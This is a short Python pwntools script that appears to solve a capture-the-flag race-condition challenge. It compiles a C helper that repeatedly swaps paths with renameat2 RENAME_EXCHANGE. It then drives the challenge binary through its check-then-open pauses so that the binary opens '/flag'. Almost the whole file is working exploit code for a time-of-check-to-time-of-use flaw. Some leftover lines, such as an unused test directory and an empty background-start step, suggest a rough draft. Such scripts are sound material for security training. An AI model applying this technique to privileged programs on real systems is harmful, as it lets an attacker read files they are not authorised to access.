from pwn import *
import os
import time
import subprocess

context.log_level = 'info'

# Compile our swap program
with open('swap.c', 'w') as f:
    f.write('''
    #define _GNU_SOURCE
    #include <stdio.h>
    #include <fcntl.h>
    #include <unistd.h>
    #include <sys/syscall.h>
    #include <linux/fs.h>

    int main(int argc, char *argv[]) {
      if (argc != 3) {
        printf("Usage: %s path1 path2\\n", argv[0]);
        return 1;
      }
      
      while (1) {
        syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
        usleep(1000); // Small delay to avoid CPU overuse
      }
      return 0;
    }
    ''')

os.system("gcc -o renameat2_swap swap.c")

# Create necessary files
os.system("mkdir -p /tmp/test_dir")

# Start the swap program in background


# Give it a moment to start
time.sleep(0.1)

# Start the challenge binary
p = process(["./babyrace_level5.0", "/tmp/"])

# First pause - After lstat check (which should pass since we sometimes get the real file)
p.recvuntil(b"Paused (press enter to continue)")
swap_process = subprocess.Popen(["./renameat2_swap", "/tmp/", "/flag"])
p.sendline(b"")

# Second pause - After directory check (which should pass assuming /tmp is properly configured)
p.recvuntil(b"Paused (press enter to continue)")
p.sendline(b"")



# Final pause - Just before open() - perfect timing for our race condition
p.recvuntil(b"Paused (press enter to continue)")



p.sendline(b"")

# Get the result
p.interactive()
